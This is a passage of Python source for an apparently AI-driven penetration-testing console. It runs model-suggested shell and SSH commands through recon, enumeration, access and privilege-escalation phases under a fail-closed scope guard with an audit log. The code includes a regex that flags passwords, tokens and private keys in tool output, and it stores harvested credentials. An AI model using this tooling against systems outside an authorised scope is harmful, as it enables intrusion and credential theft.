    lines.append("## What Didn't Work")
    if not_useful:
        for rec in not_useful[:20]:
            lines.append(f"- `{rec.command}` (exit {rec.exit_code})")
        if len(not_useful) > 20:
            lines.append(f"- ... and {len(not_useful) - 20} more")
    else:
        lines.append("- (all commands were useful)")
    lines.append("")

    # Next steps suggestion
    lines.append("## Suggested Next Steps")
    if session.phase == "recon":
        lines.append("- Run :auto for recon checks")
        lines.append("- Then :phase enum")
    elif session.phase == "enum":
        lines.append("- Run :ports to detect services")
        lines.append("- Run :svc <port> for each open port")
        lines.append("- Then :phase access when ready")
    elif session.phase == "access":
        lines.append("- Try found credentials across services")
        lines.append("- Check :tools for exploit suggestions")
        lines.append("- Once shell obtained: :ssh user@target, :phase privesc")
    elif session.phase == "privesc":
        lines.append("- Run :auto for all privesc checks")
        lines.append("- Run :tools to see downloadable exploit suggestions")
        lines.append("- Generate final report with :report")
    lines.append("")

    return "\n".join(lines)


def save_project_memory(session: Session, directory: str = "."):
    content = generate_project_memory(session)
    filepath = os.path.join(directory, "project.md")
    with open(filepath, "w", encoding="utf-8") as f:
        f.write(content)
    return filepath


def load_project_memory(directory: str = ".") -> str:
    filepath = os.path.join(directory, "project.md")
    if os.path.isfile(filepath):
        with open(filepath, encoding="utf-8", errors="replace") as f:
            return f.read()
    return ""


# ---------------------------------------------------------------------------
# Role mapping — per-phase / per-task model routing
# ---------------------------------------------------------------------------

@dataclass
class RoleMap:
    mapping: dict[str, str] = field(default_factory=dict)

    def resolve(self, phase: str) -> str:
        if phase in self.mapping:
            return self.mapping[phase]
        fallback = DEFAULT_ROLE_CHAIN.get(phase, "planner")
        if fallback in self.mapping:
            return self.mapping[fallback]
        return ""

    def set_role(self, role: str, model: str) -> None:
        self.mapping[role] = model

    def remove_role(self, role: str) -> bool:
        return self.mapping.pop(role, None) is not None

    def summary(self) -> str:
        lines = []
        for phase in PHASES:
            model = self.resolve(phase)
            direct = phase in self.mapping
            tag = " (direct)" if direct else f" (via {DEFAULT_ROLE_CHAIN.get(phase, '?')})"
            lines.append(f"  {phase:10s} -> {model or '(default)'}{tag if model else ''}")
        for role in sorted(self.mapping):
            if role not in PHASES:
                lines.append(f"  {role:10s} =  {self.mapping[role]}")
        return "\n".join(lines)


def load_roles_file(path: str = "roles.json") -> RoleMap:
    rm = RoleMap()
    if os.path.isfile(path):
        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
            if isinstance(data, dict):
                for k, v in data.items():
                    if isinstance(v, str):
                        rm.set_role(k, v)
        except (json.JSONDecodeError, OSError):
            pass
    return rm


def save_roles_file(rm: RoleMap, path: str = "roles.json") -> None:
    if rm.mapping:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(rm.mapping, f, indent=2)


# ---------------------------------------------------------------------------
# AI Backend — abstraction for Ollama and cloud APIs
# ---------------------------------------------------------------------------

@dataclass
class AIBackend:
    backend: str  # "ollama", "openai", "anthropic"
    base_url: str
    api_key: str
    planner_model: str
    executor_model: str
    roles: RoleMap = field(default_factory=RoleMap)
    structured: bool = True  # prefer schema-constrained JSON responses

    def generate(self, model: str, prompt: str, system: str = "",
                 want_json: bool = False) -> str:
        if self.backend == "ollama":
            return self._ollama_generate(model, prompt, system, want_json)
        elif self.backend == "openai":
            return self._openai_generate(model, prompt, system, want_json)
        elif self.backend == "anthropic":
            return self._anthropic_generate(model, prompt, system, want_json)
        raise ValueError(f"Unknown backend: {self.backend}")

    def model_for_phase(self, phase: str) -> str:
        role_model = self.roles.resolve(phase)
        if role_model:
            return role_model
        if phase in ("recon", "enum"):
            return self.planner_model
        return self.executor_model

    def plan(self, prompt: str, system: str = "", want_json: bool = False) -> str:
        return self.generate(self.planner_model, prompt, system, want_json)

    def analyze(self, prompt: str, system: str = "", want_json: bool = False) -> str:
        return self.generate(self.executor_model, prompt, system, want_json)

    def run_phase(self, phase: str, prompt: str, system: str = "",
                  want_json: bool = False) -> str:
        return self.generate(self.model_for_phase(phase), prompt, system, want_json)

    def ping(self) -> list[str]:
        if self.backend == "ollama":
            req = urllib.request.Request(f"{self.base_url}/api/tags")
            with urllib.request.urlopen(req, timeout=8) as resp:
                data = json.loads(resp.read().decode())
            return [m["name"] for m in data.get("models", [])]
        elif self.backend == "openai":
            req = urllib.request.Request(
                f"{self.base_url}/models",
                headers={"Authorization": f"Bearer {self.api_key}"},
            )
            with urllib.request.urlopen(req, timeout=8) as resp:
                data = json.loads(resp.read().decode())
            return [m["id"] for m in data.get("data", [])][:10]
        elif self.backend == "anthropic":
            return [self.planner_model, self.executor_model]
        return []

    def _ollama_generate(self, model: str, prompt: str, system: str,
                         want_json: bool = False) -> str:
        payload: dict[str, Any] = {
            "model": model,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": 0.15, "num_predict": 2048},
        }
        if system:
            payload["system"] = system
        if want_json:
            payload["format"] = "json"  # Ollama constrains output to valid JSON
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{self.base_url}/api/generate",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=AI_TIMEOUT) as resp:
                result = json.loads(resp.read().decode())
            return str(result.get("response", "")).strip()
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")[:800]
            raise ConnectionError(f"Ollama HTTP {exc.code}: {detail}") from exc
        except (urllib.error.URLError, TimeoutError) as exc:
            raise ConnectionError(f"Ollama unreachable: {exc}") from exc

    def _openai_generate(self, model: str, prompt: str, system: str,
                         want_json: bool = False) -> str:
        messages = []
        if system:
            messages.append({"role": "system", "content": system})
        messages.append({"role": "user", "content": prompt})
        payload: dict[str, Any] = {
            "model": model, "messages": messages,
            "temperature": 0.15, "max_tokens": 2048,
        }
        if want_json:
            payload["response_format"] = {"type": "json_object"}
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{self.base_url}/chat/completions",
            data=data,
            headers={
                "Content-Type": "application/json",
                "Authorization": f"Bearer {self.api_key}",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=AI_TIMEOUT) as resp:
                result = json.loads(resp.read().decode())
            return str(result["choices"][0]["message"]["content"]).strip()
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")[:800]
            raise ConnectionError(f"OpenAI HTTP {exc.code}: {detail}") from exc
        except (urllib.error.URLError, TimeoutError) as exc:
            raise ConnectionError(f"OpenAI unreachable: {exc}") from exc

    def _anthropic_generate(self, model: str, prompt: str, system: str,
                            want_json: bool = False) -> str:
        payload: dict[str, Any] = {
            "model": model,
            "max_tokens": 2048,
            "messages": [{"role": "user", "content": prompt}],
        }
        if system:
            # Anthropic has no JSON mode flag; the contract in the system prompt
            # plus a response prefill keeps output to a single JSON object.
            payload["system"] = system
        if want_json:
            payload["messages"].append({"role": "assistant", "content": "{"})
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{self.base_url}/messages",
            data=data,
            headers={
                "Content-Type": "application/json",
                "x-api-key": self.api_key,
                "anthropic-version": "2023-06-01",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=AI_TIMEOUT) as resp:
                result = json.loads(resp.read().decode())
            text = str(result["content"][0]["text"]).strip()
            if want_json and not text.startswith("{"):
                text = "{" + text  # restore the prefilled opening brace
            return text
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")[:800]
            raise ConnectionError(f"Anthropic HTTP {exc.code}: {detail}") from exc
        except (urllib.error.URLError, TimeoutError) as exc:
            raise ConnectionError(f"Anthropic unreachable: {exc}") from exc


# ---------------------------------------------------------------------------
# Ollama client (legacy — wraps AIBackend for backwards compat)
# ---------------------------------------------------------------------------

@dataclass
class OllamaClient:
    base_url: str
    planner_model: str
    executor_model: str
    roles: RoleMap = field(default_factory=RoleMap)
    structured: bool = True

    def model_for_phase(self, phase: str) -> str:
        role_model = self.roles.resolve(phase)
        if role_model:
            return role_model
        if phase in ("recon", "enum"):
            return self.planner_model
        return self.executor_model

    def run_phase(self, phase: str, prompt: str, system: str = "",
                  want_json: bool = False) -> str:
        return self.generate(self.model_for_phase(phase), prompt, system, want_json)

    def _post(self, path: str, payload: dict, timeout: int = AI_TIMEOUT) -> dict:
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            f"{self.base_url}{path}",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", errors="replace")[:800]
            raise ConnectionError(f"Ollama HTTP {exc.code}: {detail}") from exc
        except (urllib.error.URLError, TimeoutError) as exc:
            raise ConnectionError(f"Ollama unreachable: {exc}") from exc

    def generate(self, model: str, prompt: str, system: str = "",
                 want_json: bool = False) -> str:
        payload: dict[str, Any] = {
            "model": model,
            "prompt": prompt,
            "stream": False,
            "options": {"temperature": 0.15, "num_predict": 2048},
        }
        if system:
            payload["system"] = system
        if want_json:
            payload["format"] = "json"
        result = self._post("/api/generate", payload)
        return str(result.get("response", "")).strip()

    def plan(self, prompt: str, system: str = "", want_json: bool = False) -> str:
        return self.generate(self.planner_model, prompt, system, want_json)

    def analyze(self, prompt: str, system: str = "", want_json: bool = False) -> str:
        return self.generate(self.executor_model, prompt, system, want_json)

    def ping(self) -> list[str]:
        req = urllib.request.Request(f"{self.base_url}/api/tags")
        with urllib.request.urlopen(req, timeout=8) as resp:
            data = json.loads(resp.read().decode())
        return [m["name"] for m in data.get("models", [])]


# ---------------------------------------------------------------------------
# Scope
# ---------------------------------------------------------------------------

def load_scope(path: str) -> set[str]:
    if not os.path.isfile(path):
        return set()
    with open(path, encoding="utf-8") as f:
        data = json.load(f)
    targets = data.get("allowed_targets", [])
    return {t.strip() for t in targets if isinstance(t, str)}


# ---------------------------------------------------------------------------
# Scope enforcement — centralized, fail-closed target authorization
#
# Every route that touches a target (auto-enum, parallel, service checks,
# :scan/:run/:rrun, AI-suggested commands) is validated through one ScopeGuard
# so authorization never depends on the model "remembering" the scope. A
# missing/invalid scope fails CLOSED: execution is refused until the operator
# configures authorized targets or explicitly opts out with --allow-any-target.
# Research and planning (no target interaction) are never blocked.
# ---------------------------------------------------------------------------

_IPV4_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")


@dataclass
class ScopeGuard:
    allowed: list[str] = field(default_factory=list)   # raw entries (IPs, CIDRs, hostnames)
    configured: bool = False                           # a valid scope source was provided
    allow_any: bool = False                            # explicit --allow-any-target opt-out
    audit_path: str = "audit.log"

    def _nets(self) -> list:
        nets = []
        for entry in self.allowed:
            try:
                nets.append(ipaddress.ip_network(entry, strict=False))
            except ValueError:
                pass  # hostname, matched literally elsewhere
        return nets

    def _host_matches(self, target: str) -> bool:
        t = target.strip()
        if not t:
            return False
        if t in self.allowed:
            return True
        try:
            ip = ipaddress.ip_address(t)
            return any(ip in net for net in self._nets())
        except ValueError:
            return False  # hostname that wasn't an exact allowed entry

    def add(self, target: str) -> None:
        t = target.strip()
        if t and t not in self.allowed:
            self.allowed.append(t)
            self.configured = True

    def check(self, target: str) -> tuple[bool, str]:
        """Authorize a single target address/hostname."""
        if self.allow_any:
            return True, "scope enforcement disabled (--allow-any-target)"
        if not self.configured:
            return False, ("no authorized scope configured — execution blocked "
                           "(add targets with :scope add <t>, a scope.json, or --allow-any-target)")
        if self._host_matches(target):
            return True, "in scope"
        return False, f"{target} is not in the authorized scope"

    def check_command(self, command: str, session_target: str) -> tuple[bool, str]:
        """Authorize an execution: the session target AND every IPv4 literal in
        the command must be in scope (stops an AI/typed command from reaching an
        out-of-scope host)."""
        ok, reason = self.check(session_target)
        if not ok:
            return ok, reason
        if self.allow_any:
            return True, reason
        for ip in set(_IPV4_RE.findall(command)):
            if ip in ("127.0.0.1", "0.0.0.0"):
                continue
            if not self._host_matches(ip):
                return False, f"command references out-of-scope host {ip}"
        return True, "in scope"

    def check_free_command(self, command: str) -> tuple[bool, str]:
        """For local utility commands not bound to the session target: allow
        unless the command names an out-of-scope host (fail-closed per IP)."""
        if self.allow_any:
            return True, "scope enforcement disabled"
        for ip in set(_IPV4_RE.findall(command)):
            if ip in ("127.0.0.1", "0.0.0.0"):
                continue
            if not self.configured or not self._host_matches(ip):
                return False, f"command references out-of-scope host {ip}"
        return True, "ok"

    def audit(self, event: str, target: str, command: str, extra: str = "") -> None:
        """Append an execution/approval event to the audit trail (never fatal)."""
        try:
            rec = {
                "ts": datetime.datetime.now().isoformat(timespec="seconds"),
                "event": event, "target": target, "command": command,
            }
            if extra:
                rec["detail"] = extra
            with open(self.audit_path, "a", encoding="utf-8") as f:
                f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        except OSError:
            pass

    def status(self) -> str:
        if self.allow_any:
            return "DISABLED (--allow-any-target) — all targets permitted"
        if not self.configured:
            return "FAIL-CLOSED — no authorized targets; execution blocked"
        return f"active — {len(self.allowed)} entr{'y' if len(self.allowed)==1 else 'ies'}: {', '.join(self.allowed)}"


def build_scope_guard(scope_path: str, allow_any: bool, cli_target: str = "",
                      audit_path: str = "audit.log") -> ScopeGuard:
    guard = ScopeGuard(allow_any=allow_any, audit_path=audit_path)
    entries = load_scope(scope_path)
    for e in entries:
        guard.add(e)
    # an explicitly named --target is itself operator authorization for that host
    if cli_target:
        guard.add(cli_target)
    guard.configured = bool(guard.allowed)
    return guard


# ---------------------------------------------------------------------------
# Cheat sheet loader
# ---------------------------------------------------------------------------

def load_cheatsheets(paths: list[str]) -> str:
    parts: list[str] = []
    for p in paths:
        p = p.strip()
        if os.path.isdir(p):
            for name in sorted(os.listdir(p)):
                fp = os.path.join(p, name)
                if os.path.isfile(fp) and name.endswith((".md", ".txt")):
                    parts.append(_read_file(fp))
        elif os.path.isfile(p):
            parts.append(_read_file(p))
        else:
            print(f"[!] Cheatsheet not found: {p}")
    combined = "\n\n---\n\n".join(parts)
    # Keep a generous corpus — per-prompt relevance retrieval (retrieve_relevant)
    # picks the useful chunks, so we no longer pre-truncate to the model budget.
    corpus_cap = MAX_AI_CONTEXT * 6
    if len(combined) > corpus_cap:
        combined = combined[:corpus_cap] + "\n...[truncated]..."
    return combined


def _read_file(path: str) -> str:
    with open(path, encoding="utf-8", errors="replace") as f:
        content = f.read()
    return f"# File: {os.path.basename(path)}\n{content}"


# ---------------------------------------------------------------------------
# Context retrieval — keyword RAG over notes/evidence (pure stdlib)
#
# Small local models (7B/8B) have a limited context window. Instead of dumping
# every cheat sheet and every command output and head/tail-truncating, we chunk
# the corpus and keep only the chunks most relevant to the current query. This
# is a lightweight TF-IDF-style scorer — no embeddings, no dependencies.
# ---------------------------------------------------------------------------

_TOKEN_RE = re.compile(r"[a-z0-9][a-z0-9._/-]*")
_STOPWORDS = frozenset(
    "the a an and or of to in on for with is are be this that it we you i "
    "what how why when do does can should run try use get see check".split()
)


def _tokenize(text: str) -> list[str]:
    return [t for t in _TOKEN_RE.findall(text.lower()) if t not in _STOPWORDS and len(t) > 1]


def _chunk_text(text: str, max_chars: int = RETRIEVE_CHUNK_CHARS) -> list[str]:
    """Split text into ~max_chars chunks, preferring paragraph/heading breaks."""
    if not text.strip():
        return []
    blocks = re.split(r"\n\s*\n|\n(?=#{1,6}\s)|\n---+\n", text)
    chunks: list[str] = []
    cur = ""
    for block in blocks:
        block = block.strip("\n")
        if not block:
            continue
        if len(block) > max_chars:
            # hard-split oversized blocks on line boundaries
            for line in block.splitlines():
                if len(cur) + len(line) + 1 > max_chars and cur:
                    chunks.append(cur)
                    cur = ""
                cur += line + "\n"
            continue
        if len(cur) + len(block) + 2 > max_chars and cur:
            chunks.append(cur)
            cur = ""
        cur += block + "\n\n"
    if cur.strip():
        chunks.append(cur)
    return [c.strip() for c in chunks if c.strip()]


def retrieve_relevant(query: str, corpus: str, k: int,
                      max_chars: int = RETRIEVE_CHUNK_CHARS) -> str:
    """Return the k chunks of `corpus` most relevant to `query`, in original order."""
    chunks = _chunk_text(corpus, max_chars)
    if len(chunks) <= k:
        return corpus if len("".join(chunks)) <= k * max_chars else "\n\n".join(chunks)

    q_terms = set(_tokenize(query))
    if not q_terms:
        # no usable query — fall back to the most recent chunks
        return "\n\n".join(chunks[-k:])

    # document frequency for IDF weighting
    tokenized = [_tokenize(c) for c in chunks]
    df: dict[str, int] = {}
    for toks in tokenized:
        for t in set(toks):
            df[t] = df.get(t, 0) + 1
    n = len(chunks)

    import math
    scored: list[tuple[float, int]] = []
    for idx, toks in enumerate(tokenized):
        if not toks:
            scored.append((0.0, idx))
            continue
        tf: dict[str, int] = {}
        for t in toks:
            tf[t] = tf.get(t, 0) + 1
        score = 0.0
        for t in q_terms:
            if t in tf:
                idf = math.log(1 + n / (1 + df.get(t, 0)))
                score += (tf[t] / len(toks)) * idf
        scored.append((score, idx))

    scored.sort(key=lambda s: s[0], reverse=True)
    keep = sorted(idx for score, idx in scored[:k] if score > 0)
    if not keep:
        return "\n\n".join(chunks[-k:])
    return "\n\n".join(chunks[i] for i in keep)


# ---------------------------------------------------------------------------
# Output distillation — shrink large tool output before it hits the model
#
# nmap / enum4linux / gobuster / linpeas produce hundreds of lines. Feeding
# them whole blows the context window and buries the signal. We keep the
# interesting lines (open ports, vulns, creds, errors) plus head/tail context.
# The FULL output is always kept in the CommandRecord for the report — only the
# copy sent to the model is distilled.
# ---------------------------------------------------------------------------

_INTEREST_RE = re.compile(
    r"(?i)("
    r"\bopen\b|/tcp|/udp|VULNERABLE|CVE-\d|\bexploit\b|"
    r"password|passwd|\bcreds?\b|credential|\blogin\b|\buser(name)?s?\b|"
    r"\badmin\b|\broot\b|\bhash\b|NTLM|secret|token|api[_-]?key|"
    r"\bshare\b|writable|readable|SUID|SGID|sudo|NOPASSWD|capabilit|"
    r"\ballowed\b|anonymous|\bbind\b|\bversion\b|\bbanner\b|"
    r"denied|refused|failed|error|not permitted|unauthor|"
    # extra pentest signal that often hides in otherwise-ordinary lines
    r"\bflag\b|\bkey\b|private|-----BEGIN|\bconfig\b|database|\bdb_|"
    r"\bbackup\b|\bdefault\b|\bguest\b|enabled|disabled|permission|"
    r"directory|disallow|Set-Cookie|Server:|X-Powered-By|Location:|"
    r"\btitle\b|\bhref\b|upload|/home/|/root/|[A-Za-z]:\\\\|"
    r"\.php|\.asp|\.jsp|\.conf|\.bak|\b(200|301|302|401|403|500)\b"
    r")"
)


def distill_output(cmd: str, output: str,
                   max_lines: int = DISTILL_MAX_LINES) -> str:
    """Return a signal-dense version of `output` for model consumption.

    This only shrinks the COPY sent to the model. The full, untouched output is
    always kept in the CommandRecord and written verbatim to the report, so no
    clue is ever lost — distillation is never the only record of an output.
    """
    lines = output.splitlines()
    if len(lines) <= DISTILL_TRIGGER_LINES:
        return output

    low = cmd.lower()
    hits: set[int] = set()
    is_nmap = "nmap" in low

    if is_nmap:
        for i, ln in enumerate(lines):
            is_port = re.match(r"\s*\d+/(tcp|udp)\s", ln)
            if is_port and " open" not in ln:
                continue  # drop filtered/closed port noise
            if is_port or "VULNERABLE" in ln or ln.strip().startswith("|") \
                    or "Nmap scan report" in ln or "Service Info" in ln \
                    or "OS details" in ln:
                hits.add(i)
    else:
        for i, ln in enumerate(lines):
            if _INTEREST_RE.search(ln):
                hits.add(i)

    n = len(lines)
    # For generic output a clue often sits one line above/below a matched line
    # (banners, key/value pairs, multi-line records) — keep that context. nmap
    # port lines are self-contained, so expanding there only re-admits noise.
    ctx: set[int] = set()
    for i in hits:
        if is_nmap:
            ctx.add(i)
        else:
            ctx.update((i - 1, i, i + 1))
    ctx = {i for i in ctx if 0 <= i < n}

    if is_nmap:
        # nmap's own hit set (scan report, open ports, scripts, vulns) is the
        # signal; blind head/tail windows would only re-admit filtered noise.
        head = set(range(min(2, n)))
        tail = set()
    else:
        head = set(range(min(4, n)))
        tail = set(range(max(0, n - 4), n))
        # If very little matched on a large output, DON'T trust the filter to
        # have caught everything — fall back to a generous head+tail window.
        if len(hits) < 3:
            head |= set(range(min(30, n)))
            tail |= set(range(max(0, n - 15), n))

    # priority when capping: context around real hits first, then head, then tail
    keep: set[int] = set()
    for group in (ctx, head, tail):
        for i in sorted(group):
            if len(keep) >= max_lines:
                break
            keep.add(i)
        if len(keep) >= max_lines:
            break

    ordered = sorted(keep)
    out_lines: list[str] = []
    prev: int | None = None
    for i in ordered:
        if prev is not None and i != prev + 1:
            out_lines.append("   ...")  # mark the gap so the model sees a cut
        out_lines.append(lines[i])
        prev = i

    omitted = n - len(ordered)
    note = (f"\n...[{omitted} line(s) omitted by distiller; "
            f"full output preserved in the report/session]...") if omitted > 0 else ""
    return "\n".join(out_lines) + note


# ---------------------------------------------------------------------------
# Command execution — local, SSH, and manual
# ---------------------------------------------------------------------------

def run_command(cmd: str, timeout: int = CMD_TIMEOUT) -> tuple[int, str]:
    try:
        result = subprocess.run(
            cmd, shell=True, capture_output=True, text=True,
            timeout=timeout, env={**os.environ, "TERM": "dumb"},
        )
        out = result.stdout + ("\n" + result.stderr if result.stderr.strip() else "")
    except subprocess.TimeoutExpired:
        return 124, f"[TIMEOUT] Command timed out after {timeout}s"
    except Exception as exc:
        return 1, f"[ERROR] {exc}"
    if len(out) > MAX_OUTPUT:
        out = out[:MAX_OUTPUT] + "\n...[output truncated]..."
    return result.returncode, out.strip()


@dataclass
class SSHConnection:
    host: str
    port: int
    username: str
    key_file: str | None = None
    password: str | None = None
    _connected: bool = False

    def connect(self) -> tuple[bool, str]:
        self._clear_stale_socket()
        test_cmd = self._build_ssh_cmd("id 2>/dev/null || whoami")
        try:
            result = subprocess.run(
                test_cmd, capture_output=True, text=True, timeout=15,
            )
            if result.returncode == 0 and result.stdout.strip():
                self._connected = True
                return True, result.stdout.strip()
            return False, result.stderr.strip() or "Connection failed"
        except Exception as exc:
            return False, str(exc)

    def run(self, cmd: str, timeout: int = 30) -> tuple[int, str]:
        ssh_cmd = self._build_ssh_cmd(cmd)
        try:
            result = subprocess.run(
                ssh_cmd, capture_output=True, text=True, timeout=timeout,
            )
            out = result.stdout + ("\n" + result.stderr if result.stderr.strip() else "")
        except subprocess.TimeoutExpired:
            return 124, "[TIMEOUT]"
        except Exception as exc:
            return 1, f"[ERROR] {exc}"
        if len(out) > MAX_OUTPUT:
            out = out[:MAX_OUTPUT] + "\n...[truncated]..."
        return result.returncode, out.strip()

    def _control_path(self) -> str:
        # One multiplexed master connection per host/user/port: later commands
        # reuse it instead of re-authenticating, which is faster and keeps the
        # session warm for rapid remote enumeration.
        tag = hashlib.md5(f"{self.username}@{self.host}:{self.port}".encode()).hexdigest()[:12]
        return os.path.join(tempfile.gettempdir(), f"xsai-ssh-{tag}.sock")

    def _build_ssh_cmd(self, cmd: str) -> list[str]:
        args = [
            "ssh", "-T",  # no remote pty — stops remote commands mangling our TTY
            "-o", "StrictHostKeyChecking=accept-new",
            "-o", "ConnectTimeout=8",
            "-o", "BatchMode=yes" if self.key_file else "BatchMode=no",
            "-o", "ControlMaster=auto",
            "-o", f"ControlPath={self._control_path()}",
            "-o", "ControlPersist=120s",
            "-p", str(self.port),
        ]
        if self.key_file:
            args += ["-i", self.key_file]
        args += [f"{self.username}@{self.host}", cmd]
        return args

    def _clear_stale_socket(self) -> None:
        """Remove a leftover control socket that has no live master behind it.

        A session that died on a network drop or timeout can leave the socket
        file on disk; without this, the next connect would print 'ControlSocket
        already exists, disabling multiplexing' and silently lose connection
        reuse. We probe with '-O check' and unlink only if the master is dead."""
        cp = self._control_path()
        if not os.path.exists(cp):
            return
        alive = False
        try:
            r = subprocess.run(
                ["ssh", "-o", f"ControlPath={cp}", "-O", "check",
                 f"{self.username}@{self.host}"],
                capture_output=True, timeout=6,
            )
            alive = r.returncode == 0
        except Exception:
            alive = False
        if not alive:
            try:
                os.unlink(cp)
            except OSError:
                pass

    def close(self) -> None:
        """Tear down the persistent master connection and remove its socket."""
        cp = self._control_path()
        try:
            subprocess.run(
                ["ssh", "-o", f"ControlPath={cp}", "-O", "exit",
                 f"{self.username}@{self.host}"],
                capture_output=True, timeout=8,
            )
        except Exception:
            pass
        # make sure no stale socket is left behind to block the next connect
        try:
            if os.path.exists(cp):
                os.unlink(cp)
        except OSError:
            pass
        self._connected = False

    @property
    def label(self) -> str:
        return f"{self.username}@{self.host}:{self.port}"


# ---------------------------------------------------------------------------
# Session record — tracks everything for the final report
# ---------------------------------------------------------------------------

@dataclass
class CommandRecord:
    phase: str
    command: str
    exit_code: int
    output: str
    useful: bool = False
    note: str = ""
    remote: bool = False


@dataclass
class Session:
    target: str
    phase: str = "recon"
    cheatsheet_context: str = ""
    history: list[dict] = field(default_factory=list)
    commands: list[CommandRecord] = field(default_factory=list)
    findings: list[str] = field(default_factory=list)
    credentials: dict = field(default_factory=dict)
    ssh: SSHConnection | None = None
    target_os: str = ""  # linux, windows, or empty
    imported_from: list[str] = field(default_factory=list)  # handoff provenance
    hypotheses: list[dict] = field(default_factory=list)  # research hypotheses
    attack_chains: list[dict] = field(default_factory=list)  # linked attack scenarios

    @staticmethod
    def _norm_cmd(cmd: str) -> str:
        return " ".join(cmd.split())

    def prior_run(self, command: str, successful_only: bool = False) -> CommandRecord | None:
        """Return the most recent prior run of the same command, if any.

        Powers the re-test guard: before running a command, we check whether it
        (or an imported record of it) already ran, so the operator isn't silently
        repeating work carried over from earlier or from another analyst."""
        norm = self._norm_cmd(command)
        match: CommandRecord | None = None
        for rec in self.commands:
            if self._norm_cmd(rec.command) == norm and (not successful_only or rec.useful):
                match = rec
        return match

    def _commands_as_dicts(self) -> list[dict]:
        return [
            {
                "phase": r.phase, "command": r.command, "exit_code": r.exit_code,
                "output": r.output, "useful": r.useful, "note": r.note,
                "remote": r.remote,
            }
            for r in self.commands
        ]

    def merge_from(self, data: dict, source: str = "") -> dict:
        """Merge another analyst's saved session / export bundle into this one.

        Commands are de-duplicated by normalized command + phase, so re-importing
        or overlapping histories never double-count. The merged command history
        then feeds the re-test guard automatically."""
        stats = {"commands": 0, "findings": 0, "credentials": 0, "hypotheses": 0}
        if not self.target and data.get("target"):
            self.target = data["target"]
        if not self.target_os and data.get("target_os"):
            self.target_os = data["target_os"]
        for k, v in (data.get("credentials") or {}).items():
            if k not in self.credentials:
                self.credentials[k] = v
                stats["credentials"] += 1
        for f in data.get("findings") or []:
            if f not in self.findings:
                self.findings.append(f)
                stats["findings"] += 1
        existing = {(self._norm_cmd(r.command), r.phase) for r in self.commands}
        src = source or data.get("exported_by") or "import"
        for rec in data.get("commands") or []:
            key = (self._norm_cmd(rec.get("command", "")), rec.get("phase", ""))
            if not key[0] or key in existing:
                continue
            existing.add(key)
            note = rec.get("note", "")
            tag = f"[from {src}]"
            note = note if tag in note else f"{tag} {note}".strip()
            self.commands.append(CommandRecord(
                phase=rec.get("phase", "recon"), command=rec["command"],
                exit_code=rec.get("exit_code", 0), output=rec.get("output", ""),
                useful=rec.get("useful", False), note=note,
                remote=rec.get("remote", False),
            ))
            stats["commands"] += 1
        seen_h = {(h.get("service", ""), h.get("observation", "")) for h in self.hypotheses}
        for h in data.get("hypotheses") or []:
            key = (h.get("service", ""), h.get("observation", ""))
            if key in seen_h:
                continue
            seen_h.add(key)
            self.hypotheses.append(h)
            stats["hypotheses"] += 1
        seen_c = {(c.get("asset", ""), c.get("title", "")) for c in self.attack_chains}
        for c in data.get("attack_chains") or []:
            key = (c.get("asset", ""), c.get("title", ""))
            if key in seen_c:
                continue
            seen_c.add(key)
            self.attack_chains.append(c)
        stamp = data.get("exported_at") or data.get("saved_at") or "?"
        label = f"{src} @ {stamp}"
        if label not in self.imported_from:
            self.imported_from.append(label)
        return stats

    def export_bundle(self, filepath: str) -> str:
        """Write a self-contained handoff bundle another operator can :import."""
        data = {
            "xs_ai_bundle": "1.0",
            "exported_at": datetime.datetime.now().isoformat(),
            "target": self.target,
            "phase": self.phase,
            "target_os": self.target_os,
            "credentials": self.credentials,
            "findings": self.findings,
            "commands": self._commands_as_dicts(),
            "imported_from": self.imported_from,
            "hypotheses": self.hypotheses,
            "attack_chains": self.attack_chains,
            "project_memory": generate_project_memory(self),
        }
        os.makedirs(os.path.dirname(filepath) or ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        return filepath

    def evidence_summary(self, distill: bool = False) -> str:
        parts: list[str] = []
        for rec in self.commands:
            if rec.useful:
                prefix = "[REMOTE] " if rec.remote else ""
                body = distill_output(rec.command, rec.output) if distill else rec.output
                parts.append(f"[{rec.phase}] {prefix}$ {rec.command}\n{body}")
        return "\n\n".join(parts) if parts else "(no useful results yet)"

    def all_commands_summary(self) -> str:
        lines: list[str] = []
        for i, rec in enumerate(self.commands, 1):
            status = "USEFUL" if rec.useful else "no result"
            prefix = "(remote) " if rec.remote else ""
            lines.append(f"{i}. [{rec.phase}] {prefix}$ {rec.command}  -> {status}")
            if rec.note:
                lines.append(f"   Note: {rec.note}")
        return "\n".join(lines) if lines else "(no commands executed)"

    def save_to_file(self, filepath: str):
        data = {
            "target": self.target,
            "phase": self.phase,
            "target_os": self.target_os,
            "credentials": self.credentials,
            "findings": self.findings,
            "commands": self._commands_as_dicts(),
            "imported_from": self.imported_from,
            "hypotheses": self.hypotheses,
            "attack_chains": self.attack_chains,
            "saved_at": datetime.datetime.now().isoformat(),
        }
        os.makedirs(os.path.dirname(filepath) or ".", exist_ok=True)
        with open(filepath, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)

    @classmethod
    def load_from_file(cls, filepath: str, cheatsheet_context: str = "") -> Session:
        with open(filepath, encoding="utf-8") as f:
            data = json.load(f)
        session = cls(
            target=data["target"],
            phase=data.get("phase", "recon"),
